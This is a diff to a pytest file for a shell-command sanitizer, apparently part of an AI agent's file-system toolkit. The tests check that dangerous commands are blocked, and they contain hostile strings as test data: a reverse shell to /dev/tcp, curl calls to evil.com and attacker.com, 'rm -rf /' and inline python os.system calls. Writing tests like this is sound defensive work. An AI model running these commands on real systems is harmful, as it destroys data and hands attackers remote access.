@@ -12,6 +12,7 @@ from aden_tools.tools.file_system_toolkits.command_sanitizer import (
 # Safe commands that MUST pass validation
 # ---------------------------------------------------------------------------
 
+
 class TestSafeCommands:
     """Common dev commands that should never be blocked."""
 
@@ -82,6 +83,7 @@ class TestSafeCommands:
 # Dangerous commands that MUST be blocked
 # ---------------------------------------------------------------------------
 
+
 class TestBlockedExecutables:
     """Commands using blocked executables should raise CommandBlockedError."""
 
@@ -149,7 +151,7 @@ class TestBlockedPatterns:
             "sudo rm -rf /var/log",
             # Inline code execution
             "python -c 'import os; os.system(\"rm -rf /\")'",
-            "python3 -c '__import__(\"os\").system(\"id\")'",
+            'python3 -c \'__import__("os").system("id")\'',
             # Reverse shell indicators
             "bash -i >& /dev/tcp/10.0.0.1/4444",
             # Credential theft
@@ -199,6 +201,18 @@ class TestEdgeCases:
         with pytest.raises(CommandBlockedError):
             validate_command("FOO=bar curl http://evil.com")
 
+    @pytest.mark.parametrize(
+        "cmd",
+        [
+            "/usr/bin/curl https://attacker.com",
+            "C:\\Windows\\System32\\cmd.exe /c dir",
+        ],
+    )
+    def test_directory_prefix_does_not_bypass(self, cmd):
+        """Absolute executable paths should still match the blocklist."""
+        with pytest.raises(CommandBlockedError):
+            validate_command(cmd)
+
     def test_case_insensitive_blocking(self):
         """Blocking should be case-insensitive."""
         with pytest.raises(CommandBlockedError):
@@ -220,6 +234,18 @@ class TestEdgeCases:
         """python script.py is safe; only python -c is blocked."""
         validate_command("python script.py")
         validate_command("python -m pytest tests/")
+
+    @pytest.mark.parametrize(
+        "cmd",
+        [
+            "python -c'print(1)'",
+            'python3 -c"print(1)"',
+        ],
+    )
+    def test_python_c_with_quoted_inline_code_is_blocked(self, cmd):
+        """Quoted inline code after -c should still be blocked."""
+        with pytest.raises(CommandBlockedError):
+            validate_command(cmd)
 
     def test_error_message_is_descriptive(self):
         """Blocked commands should include a useful error message."""
